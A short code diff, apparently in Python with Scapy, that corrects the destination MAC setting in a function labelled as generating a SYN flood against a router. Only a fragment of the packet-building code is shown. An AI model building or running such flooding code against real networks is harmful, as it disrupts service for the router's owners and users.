@@ -10,7 +10,7 @@ def is_ipv6(address):
 
 # Generates SYN flood
 def spam_router(router_mac, router_ip):
-    e = Ether(router_mac)
+    e = Ether(dst = router_mac)
     t = TCP(flags="S")
     if is_ipv6(router_ip):
         i = IPv6()
